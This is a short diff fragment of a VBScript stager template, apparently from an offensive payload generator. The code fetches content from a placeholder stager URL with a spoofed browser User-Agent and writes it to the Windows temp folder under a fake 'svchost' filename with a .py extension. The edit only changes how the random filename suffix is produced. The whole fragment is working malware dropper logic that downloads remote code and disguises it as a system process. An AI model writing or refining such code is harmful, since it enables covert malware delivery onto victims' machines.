@@ -189,7 +189,7 @@ oHttp.Open "GET", "{stager_url}", False
 oHttp.SetRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
 oHttp.Send
 Set oFso = CreateObject("Scripting.FileSystemObject")
-sTmp = oFso.GetSpecialFolder(2) & "\\svchost" & CInt(Rnd * 65535) & ".py"
+sTmp = oFso.GetSpecialFolder(2) & "\\svchost" & Int(Rnd * 9999) & ".py"
 Set oTs = oFso.CreateTextFile(sTmp, True, True)
 oTs.Write oHttp.ResponseText
 oTs.Close
